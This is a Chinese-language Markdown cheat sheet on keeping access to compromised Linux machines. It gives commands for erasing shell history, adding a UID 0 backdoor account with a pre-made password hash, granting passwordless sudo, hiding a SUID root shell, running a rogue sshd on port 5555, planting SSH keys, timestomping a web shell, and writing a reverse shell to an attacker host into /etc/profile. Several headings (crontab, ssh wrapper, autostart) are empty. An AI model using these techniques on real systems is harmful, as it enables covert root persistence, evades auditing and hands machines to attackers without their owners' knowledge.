# Linux权限维持

### 0x00 隐藏历史记录

**1、在命令前加空格，命令不会被记录**

```shell
[空格]cat /etcpasswd
```

**2、设置命令不记录**

```shell
[空格]set +o history
```

恢复

```shell
set -o history
```

**3、删除history文件中指定行的命令，[num]为每行命令左边的标识。**

```shell
history -d [num]
```

**4、删除history文件内容**

```shell
# 向history文件写入空内容，覆盖原本内容
echo > ~/.bash_history

# 清空当前history记录
history -c
```



### 0x01 添加用户

**1、修改/etc/passwd，关键root权限用户**

```
/etc/passwd 各部分含义：
用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的SHELL

/etc/shadow 各部分含义：
用户名：密码的MD5加密值：自系统使用以来口令被修改的天数：口令的最小修改间隔：口令更改的周期：口令失效的天数：口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用
```

根据文件格式内容，在`/etc/passwd`中添加用户

```shell
perl -le 'print crypt("root123","salt")'			# 生成加密密码
sakVM8o4qjUfY

echo "yunkong:sakVM8o4qjUfY:0:0:root:/root:/bin/bash" >>/etc/passwd
```

**2、创建普通用户，在/etc/sudoers给这个用户添加sudo权限**

```shell
yunkong ALL=(ALL) NOPASSWD:ALL
```

**3、普通用户+SUID shell**

```shell
# 1、创建一个普通用户。

# 2、先切换成为root用户，并执行以下的命令。
cp /bin/bash /bin/.shell		# 名为.开头的隐藏文件
chmod 4755 /bin/.shell			# 赋予可执行的权限与SUID权限

# 3、切换为普通用户执行脚本。
 /bin/.shell -p  # bash2 针对 suid 有一些护卫的措施，需使用-p参数来获取一个root shell
```

### 0x02 ssh

**1、软连接**

```shell
# 1、创建一个软连接
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;

# 2、连接
ssh root@192.168.12.131 -p 5555
```

**2、SSH 公钥免密登陆**

```shell
# 1、客户端生成公钥与私钥
ssh-keygen -t rsa
# 在/root/.ssh下生成id_rsa(私钥) id_rsa.pub(公钥)

# 2、将公钥上传到目标/root/.ssh下
scp id_rsa.pub root@192.168.219.226:/root/.ssh

# 3、目标修改文件名
mv id_rsa.pub authorized_keys

# 4、检查配置文件 /etc/ssh/sshd_config
PermitRootLogin yes                                # 允许root用户远程登录
PubkeyAuthentication yes                        # 允许公钥验证
AuthorizedKeysFile      .ssh/authorized_keys       # 指定公钥文件

# 5、ssh免密登录
```

**3、 ssh warpper后门**

**4、Crontab定时任务后门**

### 修改文件属性

**1、文件创建时间**

```shell
touch -r index.php shell.php
# touch -r 命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。
```

### 4、Crontab定时任务后门



### 5、通过环境变量植入后门

常见的环境变量路径如下：

```shell
/etc/profile
/etc/profile.d/*.sh
~/.bash_profile
~/.profile
~/.bashrc
~/bash_logout
/etc/bashrc
/etc/bash.bashrc
```

将反弹shell命令写入环境变量

```shell
echo 'bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1' >> /etc/profile
```

这样当系统重启了之后，便会将shell反弹到vps上了



### 5、自启动脚本



### 6、其他方式

